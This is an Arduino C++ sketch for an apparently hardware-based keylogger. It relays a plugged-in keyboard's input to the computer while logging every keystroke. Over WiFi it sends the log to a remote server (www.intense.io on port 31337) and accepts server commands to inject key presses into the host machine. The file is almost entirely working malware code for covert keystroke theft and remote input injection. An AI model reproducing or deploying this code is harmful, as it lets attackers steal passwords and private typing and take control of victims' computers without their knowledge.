#include <SPI.h>
#include <Keyboard.h>
#include <Adafruit_WINC1500.h>

#include <hidboot.h>
#include <usbhub.h>

#include "USBKeyboardParser.h"
#include "CircularBuffer.h"
#include "keylogger.h"


/* Set up board connection definitions */
#define WINC_CS   8
#define WINC_IRQ  7
#define WINC_RST  4
#define WINC_EN   2
#define STAT_LED  13

/* Helper objects */
Adafruit_WINC1500 WiFi(WINC_CS, WINC_IRQ, WINC_RST);
Adafruit_WINC1500Client client;

CircularBuffer<log_entry> logBuffer;

USBHost slavekb;
HIDBoot<USB_HID_PROTOCOL_KEYBOARD>  HidKeyboard(&slavekb);
USBKeyboardParser parser(&logBuffer);

/* State variables */
char ssid[32] = "yournetwork";
char pass[64] = "yourpassword";
int wepKeyIndex = 0;

// IPAddress host(104,131,69,59);
char host[128] = "www.intense.io";
int port = 31337;

uint32_t last_connect_attempt;
uint32_t last_transfer_attempt;
bool connect_in_progress;

uint16_t max_transfer_time = 50;
uint8_t command_buffer[128];

inline bool isConnected() {
  return WiFi.status() == WL_CONNECTED && client.connected();
}

void halt() {
  digitalWrite(STAT_LED, HIGH);
  while(true);
}

void setup() {
  #ifdef WINC_EN
  pinMode(WINC_EN, OUTPUT);
  digitalWrite(WINC_EN, HIGH);
  #endif

  pinMode(STAT_LED, OUTPUT);
  digitalWrite(STAT_LED, LOW);

  // Halt if no WiFi hardware installed
  if(WiFi.status() == WL_NO_SHIELD) {
    halt();
  }

  // Halt if keyboard initialization fails
  if(slavekb.Init() == -1) {
    halt();
  }

  // Have our parser handle incoming keyboard events
  HidKeyboard.SetReportParser(0, &parser);

  // Connect virtual keyboard device to computer
  Keyboard.begin();

  // Assumes WPA/WPA2 network, attempt to connect
  last_connect_attempt = millis();
  connect_in_progress = true;
  WiFi.begin(ssid, pass);
}

void loop() {
  // Handle any pending USB events
  slavekb.Task();

  // Attempt to connect/reconnect if disconnected
  switch(WiFi.status()) {
    case WL_CONNECTED:
      if(connect_in_progress && millis() - last_connect_attempt > 5000) {
        last_connect_attempt = millis();
        if(client.connectSSL(host, port) || client.connect(host, port)) {
          connect_in_progress = false;
        }
      }
      break;
    case WL_IDLE_STATUS:
      if(connect_in_progress && millis() - last_connect_attempt < 10000)
        // waiting for connection timeout, do nothing
        break;
    default:
      last_connect_attempt = millis();
      connect_in_progress = true;
      WiFi.begin(ssid, pass);
  }

  // transfer pending keystrokes from the circular buffer
  // cap transfer time to minimize user's keystroke latency
  last_transfer_attempt = millis();
  if(isConnected() && logBuffer.getNumEntries() > 0) {
    client.write(SIG_SENDING);
    while(isConnected() && logBuffer.getNumEntries() > 0 && millis() - last_transfer_attempt < max_transfer_time) {
      log_entry entry = logBuffer.removeFirst();
      uint8_t buf[8];
      memcpy(buf, &entry, sizeof(log_entry));
      for(int i = 0; i < sizeof(log_entry); i++) {
        client.write(buf[i]);
      }
    }
    if(isConnected()) client.write(SIG_STOP_SEND);
  }

  // handle incoming commands from the server
  while(isConnected() && client.available() > 0 && millis() - last_transfer_attempt < max_transfer_time) {
    uint8_t command = client.read();
    switch(command) {
      case CMD_PRESS:
        Keyboard.press(client.read());
        break;
      case CMD_RELEASE:
        Keyboard.release(client.read());
        break;
    }
  }
}
